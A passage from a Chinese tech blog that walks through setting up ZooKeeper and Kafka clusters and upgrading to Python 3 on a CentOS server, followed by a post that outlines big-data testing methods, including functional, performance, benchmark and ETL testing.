<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dataDir=/usr/local/zookeeper_03/data</span><br><span class="line">clientPort=2183</span><br><span class="line">server.1=ip:2881:3881</span><br><span class="line">server.2=ip:2882:3882</span><br><span class="line">server.3=ip:2883:3883</span><br></pre></td></tr></table></figure>

<ul>
<li>分别启动zookeeper_01、zookeeper_02、zookeeper_03</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos zookeeper_01]# bin/zkServer.sh start</span><br><span class="line">[root@VM-24-13-centos zookeeper_01]# ../zookeeper_02/bin/zkServer.sh start</span><br><span class="line">[root@VM-24-13-centos zookeeper_01]# ../zookeeper_03/bin/zkServer.sh start</span><br></pre></td></tr></table></figure>

<ul>
<li>查看有三个<code>QuorumPeerMain</code>进程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@VM-24-13-centos zookeeper_01]# jps</span><br><span class="line">4674 QuorumPeerMain</span><br><span class="line">2594 NodeManager</span><br><span class="line">2467 ResourceManager</span><br><span class="line">4774 QuorumPeerMain</span><br><span class="line">32550 CMDRunner.jar</span><br><span class="line">22422 StandaloneSessionClusterEntrypoint</span><br><span class="line">30150 SecondaryNameNode</span><br><span class="line">6087 Jps</span><br><span class="line">22698 TaskManagerRunner</span><br><span class="line">29930 DataNode</span><br><span class="line">4589 QuorumPeerMa</span><br></pre></td></tr></table></figure>

<ul>
<li>查看每个zk启动的模式，发现zookeeper_03的model为leader</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@VM-24-13-centos zookeeper_01]# bin/zkServer.sh status</span><br><span class="line">ZooKeeper JMX enabled by default</span><br><span class="line">Using config: /usr/local/zookeeper_01/bin/../conf/zoo.cfg</span><br><span class="line">Client port found: 2181. Client address: localhost. Client SSL: false.</span><br><span class="line">Mode: follower</span><br><span class="line">[root@VM-24-13-centos zookeeper_01]# ../zookeeper_02/bin/zkServer.sh status</span><br><span class="line">ZooKeeper JMX enabled by default</span><br><span class="line">Using config: /usr/local/zookeeper_02/bin/../conf/zoo.cfg</span><br><span class="line">Client port found: 2182. Client address: localhost. Client SSL: false.</span><br><span class="line">Mode: follower</span><br><span class="line">[root@VM-24-13-centos zookeeper_01]# ../zookeeper_03/bin/zkServer.sh status</span><br><span class="line">ZooKeeper JMX enabled by default</span><br><span class="line">Using config: /usr/local/zookeeper_03/bin/../conf/zoo.cfg</span><br><span class="line">Client port found: 2183. Client address: localhost. Client SSL: false.</span><br><span class="line">Mode: leader</span><br></pre></td></tr></table></figure>

<h4 id="kafka介绍"><a href="#kafka介绍" class="headerlink" title="kafka介绍"></a>kafka介绍</h4><ul>
<li>kafka是Apache组织下的一个开源系统，它的最大的特性就是可以实时的处理大量数据以满足各种需求场景：比如基于hadoop平台的数据分析、低时延的实时系统、storm&#x2F;spark流式处理引擎等。kafka现在它已被多家大型公司作为多种类型的数据管道和消息系统使用。</li>
<li>来源于<a target="_blank" rel="noopener" href="https://blog.csdn.net/okhymok/article/details/103506250">这里</a></li>
</ul>
<h4 id="kafka角色"><a href="#kafka角色" class="headerlink" title="kafka角色"></a>kafka角色</h4><table>
<thead>
<tr>
<th>角色</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Broker</td>
<td>Kafka服务器，无论是单台Kafka还是集群，被统一叫做Broker</td>
</tr>
<tr>
<td>Producer</td>
<td>指消息的生产者，负责发布消息到kafka broker</td>
</tr>
<tr>
<td>Consumer</td>
<td>指消息的消费者，从kafka broker拉取数据，并消费这些已发布的消息。Kafka发布消息通常有两种模式：**队列模式（queuing）和发布&#x2F;订阅模式(publish-subscribe)**。在队列模式下，只有一个消费组，而这个消费组有多个消费者，一条消息只能被这个消费组中的一个消费者所消费；而在发布&#x2F;订阅模式下，可有多个消费组，每个消费组只有一个消费者，同一条消息可被多个消费组消费</td>
</tr>
<tr>
<td>Topic</td>
<td>主题，用于建立生产者和消费者之间的订阅关系，生产者将消息发送到指定的Topic，然后消费者再从该Topic下去取消息</td>
</tr>
<tr>
<td>Partition</td>
<td>消息分区，一个Topic下面会有多个Partition，每个Partition都是一个有序队列，Partition中的每条消息都会被分配一个有序的id。</td>
</tr>
<tr>
<td>Consumer Group</td>
<td>消费者组，可以给每个Consumer指定消费组，若不指定消费者组，则属于默认的group</td>
</tr>
<tr>
<td>Message</td>
<td>消息，通信的基本单位，每个producer可以向一个topic发布一些消息。</td>
</tr>
</tbody></table>
<h4 id="kafka工作流程"><a href="#kafka工作流程" class="headerlink" title="kafka工作流程"></a>kafka工作流程</h4><ul>
<li><p>生产者定期向主题发送消息。</p>
</li>
<li><p>Kafka broker将所有消息存储在为该特定主题配置的分区中。它确保消息在分区之间平等共享。如果生产者发送两个消息，并且有两个分区，则Kafka将在第一个分区中存储一个消息，在第二个分区中存储第二个消息。</p>
</li>
<li><p>消费者订阅一个特定的主题。一旦消费者订阅了一个主题，Kafka将向消费者提供该主题的当前偏移量，并将偏移量保存在ZooKeeper中。</p>
</li>
<li><p>消费者将定期请求Kafka新消息。</p>
</li>
<li><p>一旦Kafka收到来自生产者的消息，它会将这些消息转发给消费者。消费者将收到消息并处理它。</p>
</li>
<li><p>一旦消息被处理，消费者将向Kafka broker发送确认。</p>
</li>
<li><p>一旦Kafka收到确认，它会将偏移量更改为新值，并在ZooKeeper中进行更新。由于ZooKeeper中保留了偏移量，因此即使在服务器出现故障时，消费者也可以正确读取下一条消息</p>
</li>
</ul>
<h4 id="kafka拓扑架构"><a href="#kafka拓扑架构" class="headerlink" title="kafka拓扑架构"></a>kafka拓扑架构</h4><ul>
<li>一个典型的Kafka集群包含若干Producer，若干broker、若干Consumer Group，以及一个Zookeeper集群。Kafka通过Zookeeper管理集群配置，选举leader，以及在Consumer Group发生变化时进行rebalance。Producer使用push模式将消息发布到broker，Consumer使用pull模式从broker订阅并消费消息。典型架构如下图所示</li>
</ul>
<p><img src="/aposts/d4ea272f/image-20220107101958730.png" alt="image-20220107101958730"></p>
<h4 id="安装配置kafka"><a href="#安装配置kafka" class="headerlink" title="安装配置kafka"></a>安装配置kafka</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate https://dlcdn.apache.org/kafka/3.0.0/kafka_2.12-3.0.0.tgz</span><br><span class="line">tar -zxvf kafka_2.12-3.0.0.tgz</span><br><span class="line">mv kafka_2.12-3.0.0 kafka</span><br><span class="line">cd kafka</span><br></pre></td></tr></table></figure>

<ul>
<li>复制server.properties命名为server1.properties，配置如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cd kafka/config</span><br><span class="line">cp server.properties server1.properties</span><br><span class="line">vi server1.properties</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务器标识</span></span><br><span class="line">broker.id=1</span><br><span class="line">listeners=PLAINTEXT://10.0.24.13:9091</span><br><span class="line">log.dirs=/usr/kafka/kafka-logs1</span><br><span class="line">zookeeper.connect=10.0.24.13:2181,10.0.24.13:2182,10.0.24.13:2183</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>复制server1.properties命名为server2.properties，配置如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cp server.properties1 server2.properties</span><br><span class="line">vi server1.properties</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务器标识</span></span><br><span class="line">broker.id=2</span><br><span class="line">listeners=PLAINTEXT://10.0.24.13:9092</span><br><span class="line">log.dirs=/usr/kafka/kafka-logs2</span><br><span class="line">zookeeper.connect=10.0.24.13:2182,10.0.24.13:2182,10.0.24.13:2182</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>复制server1.properties命名为server3.properties，配置如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cp server.properties1 server3.properties</span><br><span class="line">vi server3.properties</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务器标识</span></span><br><span class="line">broker.id=3</span><br><span class="line">advertised.listeners=PLAINTEXT://10.0.24.13:9093</span><br><span class="line">log.dirs=/usr/kafka/kafka-logs3</span><br><span class="line">zookeeper.connect=10.0.24.13:2881,10.0.24.13:2882,10.0.24.13:2883</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建日志文件</span></span><br><span class="line">[root@VM-24-13-centos kafka]# mkdir kafka-logs1 kafka-logs2 kafka-logs3</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>修改<code>bin</code>目录下的<code>kafka-server-start.sh</code>文件，将初始堆的大小(-Xms)设置小一些，不然启动报错</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KAFKA_HEAP_OPTS=&quot;-Xmx1024M -Xms128M&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>启动kafka。切记先要启动zk</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@VM-24-13-centos local]# kafka/bin/kafka-server-start.sh kafka/config/server1.properties</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos local]# kafka/bin/kafka-server-start.sh kafka/config/server2.properties</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos local]# kafka/bin/kafka-server-start.sh kafka/config/server3.properties</span><br><span class="line">...</span><br><span class="line">2022-01-07 18:28:37,222] INFO [ExpirationReaper-3-topic]: Starting (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)</span><br><span class="line">[2022-01-07 18:28:37,239] INFO [ExpirationReaper-3-Heartbeat]: Starting (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)</span><br><span class="line">[2022-01-07 18:28:37,249] INFO [ExpirationReaper-3-Rebalance]: Starting (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)</span><br><span class="line">[2022-01-07 18:28:37,266] INFO [GroupCoordinator 3]: Starting up. (kafka.coordinator.group.GroupCoordinator)</span><br><span class="line">[2022-01-07 18:28:37,271] INFO [GroupCoordinator 3]: Startup complete. (kafka.coordinator.group.GroupCoordinator)</span><br><span class="line">[2022-01-07 18:28:37,289] INFO [TransactionCoordinator id=3] Starting up. (kafka.coordinator.transaction.TransactionCoordinator)</span><br><span class="line">[2022-01-07 18:28:37,292] INFO [TransactionCoordinator id=3] Startup complete. (kafka.coordinator.transaction.TransactionCoordinator)</span><br><span class="line">[2022-01-07 18:28:37,302] INFO [Transaction Marker Channel Manager 3]: Starting (kafka.coordinator.transaction.TransactionMarkerChannelManager)</span><br><span class="line">[2022-01-07 18:28:37,332] INFO [ExpirationReaper-3-AlterAcls]: Starting (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)</span><br><span class="line">[2022-01-07 18:28:37,367] INFO [SocketServer listenerType=ZK_BROKER, nodeId=3] Starting socket server acceptors and processors (kafka.network.SocketServer)</span><br><span class="line">[2022-01-07 18:28:37,370] INFO [/config/changes-event-process-thread]: Starting (kafka.common.ZkNodeChangeNotificationListener$ChangeEventProcessThread)</span><br><span class="line">[2022-01-07 18:28:37,396] INFO [SocketServer listenerType=ZK_BROKER, nodeId=3] Started data-plane acceptor and processor(s) for endpoint : ListenerName(PLA</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>查看kafka和flink是否启动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# jps</span><br><span class="line">5187 QuorumPeerMain # zk</span><br><span class="line">10853 Jps</span><br><span class="line">5110 QuorumPeerMain # zk</span><br><span class="line">5271 QuorumPeerMain # zk</span><br><span class="line">10407 Kafka #kafka</span><br><span class="line">4216 StandaloneSessionClusterEntrypoint</span><br><span class="line">9866 Kafka # kafka</span><br><span class="line">4491 TaskManagerRunner # flink</span><br><span class="line">8494 Kafka # kafka</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h3><ul>
<li>服务器现在默认用的python2.7，现在升级为python3</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装依赖文件</span></span><br><span class="line">yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make</span><br><span class="line"></span><br><span class="line">wget https://www.python.org/ftp/python/3.7.9/Python-3.7.9.tar.xz</span><br><span class="line">tar -xvf Python-3.7.9.tar.xz</span><br><span class="line">cd Python-3.7.9.tar.xz</span><br><span class="line"></span><br><span class="line">./configure prefix=/usr/local/python3.7.9 # 指定编译python存放路径</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<ul>
<li>备份python2</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /usr/bin/python /usr/bin/python.bak</span><br></pre></td></tr></table></figure>

<ul>
<li>创建软链接</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/python3/bin/python3 /usr/bin/python</span><br></pre></td></tr></table></figure>

<ul>
<li>修改yum配置文件。由于执行CentOS的yum命令需要使用自带的python2的版本，所以需要做两处修改</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/bin/yum</span><br><span class="line">vi /usr/libexec/urlgrabber-ext-down</span><br><span class="line"></span><br><span class="line">将 这两个文件的 #!/usr/bin/python修改为 #!/usr/bin/python2</span><br></pre></td></tr></table></figure>

<ul>
<li>查看python3版本</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos local]# python --version</span><br><span class="line">Python 3.7.9</span><br></pre></td></tr></table></figure>

<h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><ul>
<li>暂时放弃，服务器内存不足，在一台机器上部署分布式配置不够</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/549ce9d8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="一个正经的测试工程师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="施坤的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/aposts/549ce9d8/" class="post-title-link" itemprop="url">第七章 大数据测试方法</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-12-31 10:35:43" itemprop="dateCreated datePublished" datetime="2021-12-31T10:35:43+08:00">2021-12-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-25 11:20:56" itemprop="dateModified" datetime="2022-02-25T11:20:56+08:00">2022-02-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/" itemprop="url" rel="index"><span itemprop="name">大数据</span></a>
                </span>
            </span>

          
            <span id="/aposts/549ce9d8/" class="post-meta-item leancloud_visitors" data-flag-title="第七章 大数据测试方法" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/aposts/549ce9d8/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/aposts/549ce9d8/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="与传统测试区别"><a href="#与传统测试区别" class="headerlink" title="与传统测试区别"></a>与传统测试区别</h2><p><img src="/aposts/549ce9d8/image-20211231104504478.png" alt="image-20211231104504478"></p>
<h2 id="功能测试"><a href="#功能测试" class="headerlink" title="功能测试"></a>功能测试</h2><h3 id="数据质量"><a href="#数据质量" class="headerlink" title="数据质量"></a>数据质量</h3><ul>
<li>主要包括4种测试方法</li>
</ul>
<p><img src="/aposts/549ce9d8/image-20211231104800758.png" alt="image-20211231104800758"></p>
<h3 id="常用的功能测试方法"><a href="#常用的功能测试方法" class="headerlink" title="常用的功能测试方法"></a>常用的功能测试方法</h3><h4 id="数据约束检查"><a href="#数据约束检查" class="headerlink" title="数据约束检查"></a>数据约束检查</h4><ul>
<li>如数据类型、长度、索引、主键等是否符合要求</li>
</ul>
<h4 id="数据存储检查"><a href="#数据存储检查" class="headerlink" title="数据存储检查"></a>数据存储检查</h4><ul>
<li>是否需要压缩文件形式存储</li>
<li>hive表类型是否合理（内外部表、分区、分桶表）</li>
<li>代码中读取、写入文件目录是否正确</li>
</ul>
<h4 id="SQL文件检查"><a href="#SQL文件检查" class="headerlink" title="SQL文件检查"></a>SQL文件检查</h4><p>开发规范检查。一般公司都有自己的规范，如hiveql中的：</p>
<ul>
<li>注释</li>
<li>字段，不行用*代替全部</li>
<li>…..</li>
</ul>
<h4 id="SQ语法检查"><a href="#SQ语法检查" class="headerlink" title="SQ语法检查"></a>SQ语法检查</h4><ul>
<li>合理使用insert into、insert overwrite、order by、group by等</li>
</ul>
<h4 id="数据处理逻辑验证"><a href="#数据处理逻辑验证" class="headerlink" title="数据处理逻辑验证"></a>数据处理逻辑验证</h4><ul>
<li>脏数据处理是否符合预期</li>
<li>去重处理</li>
</ul>
<h4 id="shell脚本测试"><a href="#shell脚本测试" class="headerlink" title="shell脚本测试"></a>shell脚本测试</h4><ul>
<li>测试jar包是否引用正确</li>
<li>mapper、reducer文件、mapreduce依赖文件等路径、运行配置参数是否合理</li>
<li>我对shell不熟悉，一般采用python</li>
</ul>
<h4 id="调度任务测试"><a href="#调度任务测试" class="headerlink" title="调度任务测试"></a>调度任务测试</h4><ul>
<li>是否支持重跑</li>
<li>依赖层次是否合理</li>
<li>任务是否在规定时间完成等</li>
</ul>
<h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><p>主要由六种测试：基准测试、并发测试、负载测试、压力测试、容量测试、稳定性测试</p>
<h3 id="性能测试步骤"><a href="#性能测试步骤" class="headerlink" title="性能测试步骤"></a>性能测试步骤</h3><p><img src="/aposts/549ce9d8/image-20211231111135709.png" alt="image-20211231111135709"></p>
<h3 id="性能测试案例"><a href="#性能测试案例" class="headerlink" title="性能测试案例"></a>性能测试案例</h3><ul>
<li><p>以<a target="_blank" rel="noopener" href="https://moon-full.gitee.io/2021/12/29/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/#%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E6%A1%88%E4%BE%8B">第六章用户行为分析平台</a>为例子，采用YCSB工具，对平台底层Kudu进行性能测试</p>
</li>
<li><p>YCSB 是雅虎开源的性能测试工具，对NoSql产品进行测试和评估，如HBase、MongoDB等</p>
</li>
</ul>
<h4 id="测试场景"><a href="#测试场景" class="headerlink" title="测试场景"></a>测试场景</h4><p><img src="/aposts/549ce9d8/image-20211231152400144.png" alt="image-20211231152400144"></p>
<h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p><img src="/aposts/549ce9d8/image-20211231152443995.png" alt="image-20211231152443995"></p>
<p><img src="/aposts/549ce9d8/image-20211231153058203.png" alt="image-20211231153058203"></p>
<h2 id="大数据基准测试"><a href="#大数据基准测试" class="headerlink" title="大数据基准测试"></a>大数据基准测试</h2><p>对大数据框架、大数据平台、工具的出现进行基准测试，测试步骤分为：</p>
<ul>
<li><p>数据准备</p>
</li>
<li><p>负载选择</p>
</li>
</ul>
<p><img src="/aposts/549ce9d8/image-20211231153711579.png" alt="image-20211231153711579"></p>
<ul>
<li>指标度量</li>
</ul>
<h3 id="基准测试工具"><a href="#基准测试工具" class="headerlink" title="基准测试工具"></a>基准测试工具</h3><p><img src="/aposts/549ce9d8/image-20211231153834017.png" alt="image-20211231153834017"></p>
<h2 id="大数据ETL测试"><a href="#大数据ETL测试" class="headerlink" title="大数据ETL测试"></a>大数据ETL测试</h2><h3 id="ETL测试类型"><a href="#ETL测试类型" class="headerlink" title="ETL测试类型"></a>ETL测试类型</h3><h4 id="元数据测试"><a href="#元数据测试" class="headerlink" title="元数据测试"></a>元数据测试</h4><ul>
<li>验证表定义是否符号数据模型和应用程序的设计规范，包括对数据类型、数据长度、索引和约束等</li>
</ul>
<h4 id="数据完整性测试"><a href="#数据完整性测试" class="headerlink" title="数据完整性测试"></a>数据完整性测试</h4><ul>
<li>目的是验证是否已将预期数据从源加载到目标中，主要测试：比较源和目标之间的计数，如最大、最小、总和、均值和实际数据量</li>
</ul>
<h4 id="数据转换测试"><a href="#数据转换测试" class="headerlink" title="数据转换测试"></a>数据转换测试</h4><ul>
<li>白盒测试。用sql或pl&#x2F;sql对数据转换，用转换后的数据与目标中数据比较</li>
<li>黑盒测试。外部界面方式造数据完成转换，用转换后的数据与目标中数据比较</li>
</ul>
<h4 id="增量ETL测试"><a href="#增量ETL测试" class="headerlink" title="增量ETL测试"></a>增量ETL测试</h4><p>目的是验证源上的更新能否正确加载到目标系统中</p>
<h3 id="ETL集成测试"><a href="#ETL集成测试" class="headerlink" title="ETL集成测试"></a>ETL集成测试</h3><p>如下几个步骤：</p>
<ul>
<li>在源系统中，设置测试数据</li>
<li>执行ETL过程把数据加载到目标中</li>
<li>查看或处理目标系统中数据</li>
<li>验证数据和使用该数据的应用程序的功能</li>
</ul>
<h4 id="ETL性能测试"><a href="#ETL性能测试" class="headerlink" title="ETL性能测试"></a>ETL性能测试</h4><p>略</p>
<h3 id="ETL测试场景"><a href="#ETL测试场景" class="headerlink" title="ETL测试场景"></a>ETL测试场景</h3><h4 id="实时数据ETL和测试"><a href="#实时数据ETL和测试" class="headerlink" title="实时数据ETL和测试"></a>实时数据ETL和测试</h4><ul>
<li>实时数据一般指分钟级别以下，通常包括实时计算、存储、展示和分析等。</li>
</ul>
<p><img src="/aposts/549ce9d8/image-20211231161902589.png" alt="image-20211231161902589"></p>
<ul>
<li>原始数据:可以理解为上游原始数据。对于整个上层消费应用，除数据本身以外，其他都是“黑盒，即不可见。目前，对于接入的数据源，常见的提供数据的方式人 Kafka、MQ 等。</li>
<li>实时数据处理:这是整个数据流转路径的核心，负责根据业务需求对原始数据进行理并转发。常见的处理实时数据的应用框架有Flink、Storm和SparkStreaming等。</li>
<li>数据存储:用于保存处理后的数据。对于业务功能，可以在这里获取需要使用的数据。在这里，我们一般使用基于内存的key-value数据库 Redis，以及列式数据医。 ClickHouse、MongoDB和HDFS等。另外，我们可以将数据转发至另一个数握 通道。</li>
<li>数据应用:数据的具体使用。在这里，我们可以对数据进行业务层面的处理、数据的可视化展示。</li>
</ul>
<h4 id="离线数据ETL和测试"><a href="#离线数据ETL和测试" class="headerlink" title="离线数据ETL和测试"></a>离线数据ETL和测试</h4><ul>
<li>离线数据一般采用T+1模式，即每天凌晨处理前一天的数据，一般采用Sqoop，datax，Flume和MapReduce等</li>
</ul>
<p><img src="/aposts/549ce9d8/image-20211231163101257.png" alt="image-20211231163101257"></p>
<ul>
<li>对于不同的数据仓库结构，有不同的测试点</li>
</ul>
<p><img src="/aposts/549ce9d8/image-20211231163336807.png" alt="image-20211231163336807"></p>
<h4 id="大数据ETL测试工具"><a href="#大数据ETL测试工具" class="headerlink" title="大数据ETL测试工具"></a>大数据ETL测试工具</h4><ul>
<li>iCDQ</li>
<li>Talend</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/8/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/10/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">


    <div class="sidebar-inner">



      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
